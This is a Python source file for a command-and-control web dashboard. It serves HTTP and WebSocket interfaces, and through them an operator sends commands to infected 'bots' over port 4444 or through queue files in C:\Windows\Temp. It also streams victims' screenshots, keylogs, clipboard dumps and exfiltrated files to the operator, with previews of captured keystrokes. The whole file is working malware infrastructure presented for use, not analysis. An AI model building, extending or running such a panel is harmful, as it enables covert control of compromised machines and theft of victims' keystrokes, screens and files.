#!/usr/bin/env python3
"""
Enhanced C2 Web Dashboard with WebSocket Support
Real-time bidirectional communication between dashboard and C2 server
"""

import asyncio
import websockets
import json
import os
import time
import threading
import glob
import base64
from datetime import datetime
from http.server import HTTPServer, SimpleHTTPRequestHandler
import socket
from urllib.parse import urlparse, parse_qs
import queue

# Configuration
HTTP_PORT = 8080
WS_PORT = 8081
C2_COMMAND_PORT = 4444

# Global state
connected_websockets = set()
command_queue = queue.Queue()
status_cache = {}
last_file_check = {}

class C2CommandBridge:
    """Bridge between web interface and C2 server"""
    
    def __init__(self):
        self.command_socket = None
        
    def send_command_to_c2(self, client_id, command, parameters=None):
        """Send command to C2 server via TCP socket"""
        try:
            # Create connection to C2 command port
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            # Try to connect to C2 server
            try:
                sock.connect(('127.0.0.1', C2_COMMAND_PORT))
            except:
                # C2 might not have command port, send via file
                return self.queue_command_via_file(client_id, command, parameters)
            
            # Format command packet
            cmd_packet = {
                "source": "WEB_DASHBOARD",
                "client_id": client_id,
                "command": command,
                "parameters": parameters or {},
                "timestamp": int(time.time())
            }
            
            # Send command
            cmd_json = json.dumps(cmd_packet)
            sock.send(cmd_json.encode() + b'\n')
            
            # Get response
            response = sock.recv(4096).decode()
            sock.close()
            
            return {
                "status": "success",
                "message": f"Command '{command}' sent to {client_id}",
                "response": response
            }
            
        except Exception as e:
            return self.queue_command_via_file(client_id, command, parameters)
    
    def queue_command_via_file(self, client_id, command, parameters=None):
        """Queue command via file system for C2 to pick up"""
        try:
            # Create command queue directory
            queue_dir = "C:\\Windows\\Temp\\C2_CommandQueue"
            os.makedirs(queue_dir, exist_ok=True)
            
            # Create command file
            cmd_data = {
                "client_id": client_id,
                "command": command,
                "parameters": parameters or {},
                "timestamp": int(time.time()),
                "source": "web_dashboard"
            }
            
            # Write to timestamped file
            cmd_file = os.path.join(queue_dir, f"cmd_{int(time.time() * 1000)}_{client_id}.json")
            with open(cmd_file, 'w') as f:
                json.dump(cmd_data, f)
            
            return {
                "status": "queued",
                "message": f"Command '{command}' queued for {client_id}",
                "file": cmd_file
            }
            
        except Exception as e:
            return {
                "status": "error",
                "message": f"Failed to queue command: {str(e)}"
            }

# Global command bridge
command_bridge = C2CommandBridge()

async def broadcast_update(message_type, data):
    """Broadcast update to all connected WebSocket clients"""
    if connected_websockets:
        message = json.dumps({
            "type": message_type,
            "data": data,
            "timestamp": int(time.time())
        })
        
        # Send to all connected clients
        disconnected = set()
        for websocket in connected_websockets:
            try:
                await websocket.send(message)
            except:
                disconnected.add(websocket)
        
        # Remove disconnected clients
        connected_websockets.difference_update(disconnected)

async def monitor_c2_status():
    """Monitor C2 status files and broadcast updates"""
    while True:
        try:
            # Check main status file
            status_file = "C:\\Windows\\Temp\\C2_Status.json"
            if os.path.exists(status_file):
                mtime = os.path.getmtime(status_file)
                if status_file not in last_file_check or last_file_check[status_file] < mtime:
                    with open(status_file, 'r') as f:
                        status = json.load(f)
                    last_file_check[status_file] = mtime
                    await broadcast_update("status_update", status)
            
            # Check for client updates
            bot_files = glob.glob("C:\\Windows\\Temp\\C2_Bots\\*.json")
            clients_data = []
            
            for bot_file in bot_files:
                mtime = os.path.getmtime(bot_file)
                if bot_file not in last_file_check or last_file_check[bot_file] < mtime:
                    try:
                        with open(bot_file, 'r') as f:
                            client_data = json.load(f)
                        clients_data.append(client_data)
                        last_file_check[bot_file] = mtime
                    except:
                        continue
            
            if clients_data:
                await broadcast_update("clients_update", {"clients": clients_data})
            
            # Check for new screenshots
            screenshot_dir = "C:\\Windows\\Temp\\C2_Screenshots"
            if os.path.exists(screenshot_dir):
                for file in os.listdir(screenshot_dir):
                    if file.endswith('.b64'):
                        file_path = os.path.join(screenshot_dir, file)
                        mtime = os.path.getmtime(file_path)
                        if file_path not in last_file_check or last_file_check[file_path] < mtime:
                            # Extract client ID from filename
                            client_id = file.split('_')[0]
                            await broadcast_update("new_screenshot", {
                                "client_id": client_id,
                                "filename": file,
                                "timestamp": mtime
                            })
                            last_file_check[file_path] = mtime
            
            # Check for new keylogs
            keylog_dir = "C:\\Windows\\Temp\\C2_Keylogs"
            if os.path.exists(keylog_dir):
                for file in os.listdir(keylog_dir):
                    if file.endswith('.txt') and file != "MASTER_KEYLOG.txt":
                        file_path = os.path.join(keylog_dir, file)
                        mtime = os.path.getmtime(file_path)
                        if file_path not in last_file_check or last_file_check[file_path] < mtime:
                            client_id = file.split('_')[0]
                            await broadcast_update("new_keylog", {
                                "client_id": client_id,
                                "filename": file,
                                "timestamp": mtime
                            })
                            last_file_check[file_path] = mtime
            
            # Check activity log for real-time events
            activity_log = "C:\\Windows\\Temp\\c2_activity.log"
            if os.path.exists(activity_log):
                mtime = os.path.getmtime(activity_log)
                if activity_log not in last_file_check or last_file_check[activity_log] < mtime:
                    # Read last few lines
                    with open(activity_log, 'r') as f:
                        lines = f.readlines()
                        recent_activities = []
                        for line in lines[-10:]:  # Last 10 activities
                            if line.strip():
                                parts = line.strip().split('] [')
                                if len(parts) >= 3:
                                    timestamp = parts[0].strip('[')
                                    category = parts[1]
                                    action = parts[2].split('] ', 1)[0]
                                    message = parts[2].split('] ', 1)[1] if '] ' in parts[2] else ''
                                    recent_activities.append({
                                        "timestamp": timestamp,
                                        "category": category,
                                        "action": action,
                                        "message": message
                                    })
                        
                        if recent_activities:
                            await broadcast_update("activity_log", {"activities": recent_activities})
                    
                    last_file_check[activity_log] = mtime
            
        except Exception as e:
            print(f"Error in monitor: {str(e)}")
        
        await asyncio.sleep(1)  # Check every second

async def handle_websocket(websocket, path):
    """Handle WebSocket connections"""
    # Register client
    connected_websockets.add(websocket)
    client_ip = websocket.remote_address[0]
    print(f"[WS] New WebSocket connection from {client_ip}")
    
    try:
        # Send initial data
        await websocket.send(json.dumps({
            "type": "welcome",
            "message": "Connected to C2 WebSocket server",
            "timestamp": int(time.time())
        }))
        
        # Handle messages from client
        async for message in websocket:
            try:
                data = json.loads(message)
                msg_type = data.get("type")
                
                if msg_type == "command":
                    # Execute command on specific client
                    client_id = data.get("client_id")
                    command = data.get("command")
                    parameters = data.get("parameters", {})
                    
                    result = command_bridge.send_command_to_c2(client_id, command, parameters)
                    
                    await websocket.send(json.dumps({
                        "type": "command_result",
                        "result": result,
                        "request_id": data.get("request_id")
                    }))
                    
                elif msg_type == "get_status":
                    # Send current status
                    status_file = "C:\\Windows\\Temp\\C2_Status.json"
                    if os.path.exists(status_file):
                        with open(status_file, 'r') as f:
                            status = json.load(f)
                        await websocket.send(json.dumps({
                            "type": "status_update",
                            "data": status
                        }))
                
                elif msg_type == "get_clients":
                    # Send all clients
                    clients = []
                    bot_files = glob.glob("C:\\Windows\\Temp\\C2_Bots\\*.json")
                    for bot_file in bot_files:
                        try:
                            with open(bot_file, 'r') as f:
                                clients.append(json.load(f))
                        except:
                            continue
                    
                    await websocket.send(json.dumps({
                        "type": "clients_update",
                        "data": {"clients": clients}
                    }))
                
                elif msg_type == "get_client_detail":
                    # Get detailed info for specific client
                    client_id = data.get("client_id")
                    details = get_client_details(client_id)
                    
                    await websocket.send(json.dumps({
                        "type": "client_detail",
                        "data": details,
                        "client_id": client_id
                    }))
                
            except json.JSONDecodeError:
                await websocket.send(json.dumps({
                    "type": "error",
                    "message": "Invalid JSON"
                }))
            except Exception as e:
                await websocket.send(json.dumps({
                    "type": "error",
                    "message": str(e)
                }))
    
    except websockets.exceptions.ConnectionClosed:
        pass
    finally:
        # Unregister client
        connected_websockets.remove(websocket)
        print(f"[WS] WebSocket disconnected from {client_ip}")

def get_client_details(client_id):
    """Get detailed information for a specific client"""
    details = {
        "client_id": client_id,
        "screenshots": [],
        "keylogs": [],
        "exfiltrated_files": [],
        "clipboard_dumps": []
    }
    
    # Screenshot data
    screenshot_dir = "C:\\Windows\\Temp\\C2_Screenshots"
    if os.path.exists(screenshot_dir):
        for file in os.listdir(screenshot_dir):
            if client_id in file:
                file_path = os.path.join(screenshot_dir, file)
                file_stat = os.stat(file_path)
                details["screenshots"].append({
                    "filename": file,
                    "size": file_stat.st_size,
                    "timestamp": file_stat.st_mtime
                })
    
    # Keylog data
    keylog_dir = "C:\\Windows\\Temp\\C2_Keylogs"
    if os.path.exists(keylog_dir):
        for file in os.listdir(keylog_dir):
            if client_id in file and file != "MASTER_KEYLOG.txt":
                file_path = os.path.join(keylog_dir, file)
                file_stat = os.stat(file_path)
                
                # Read last few lines of keylog
                preview = ""
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        lines = f.readlines()
                        preview = ''.join(lines[-20:])  # Last 20 lines
                except:
                    preview = "Unable to read file"
                
                details["keylogs"].append({
                    "filename": file,
                    "size": file_stat.st_size,
                    "timestamp": file_stat.st_mtime,
                    "preview": preview
                })
    
    return details

class EnhancedHTTPHandler(SimpleHTTPRequestHandler):
    """HTTP handler with WebSocket info endpoint"""
    
    def do_GET(self):
        if self.path == '/ws-info':
            # Return WebSocket connection info
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            info = {
                "ws_url": f"ws://localhost:{WS_PORT}",
                "connected_clients": len(connected_websockets),
                "status": "active"
            }
            self.wfile.write(json.dumps(info).encode())
        else:
            # Serve files normally
            super().do_GET()

async def start_websocket_server():
    """Start the WebSocket server"""
    print(f"[*] Starting WebSocket server on port {WS_PORT}...")
    server = await websockets.serve(handle_websocket, "0.0.0.0", WS_PORT)
    print(f"[+] WebSocket server started on ws://localhost:{WS_PORT}")
    
    # Start monitoring task
    asyncio.create_task(monitor_c2_status())
    
    await server.wait_closed()

def run_http_server():
    """Run the HTTP server in a separate thread"""
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    httpd = HTTPServer(("", HTTP_PORT), EnhancedHTTPHandler)
    print(f"[+] HTTP server started on http://localhost:{HTTP_PORT}")
    httpd.serve_forever()

def main():
    """Main entry point"""
    print("""
    ╔═══════════════════════════════════════════════════════╗
    ║      C2 WEB DASHBOARD - WEBSOCKET ENHANCED            ║
    ╠═══════════════════════════════════════════════════════╣
    ║  [*] Starting servers...                              ║
    ║  [*] HTTP Server: http://localhost:8080              ║
    ║  [*] WebSocket: ws://localhost:8081                  ║
    ║                                                       ║
    ║  [!] Make sure escapebox.exe server is running!      ║
    ╚═══════════════════════════════════════════════════════╝
    """)
    
    # Create necessary directories
    directories = [
        "C:\\Windows\\Temp\\C2_Bots",
        "C:\\Windows\\Temp\\C2_Screenshots",
        "C:\\Windows\\Temp\\C2_Keylogs",
        "C:\\Windows\\Temp\\C2_CommandQueue"
    ]
    
    for directory in directories:
        os.makedirs(directory, exist_ok=True)
    
    # Start HTTP server in thread
    http_thread = threading.Thread(target=run_http_server, daemon=True)
    http_thread.start()
    
    # Run WebSocket server
    try:
        asyncio.run(start_websocket_server())
    except KeyboardInterrupt:
        print("\n[*] Shutting down servers...")

if __name__ == "__main__":
    main()
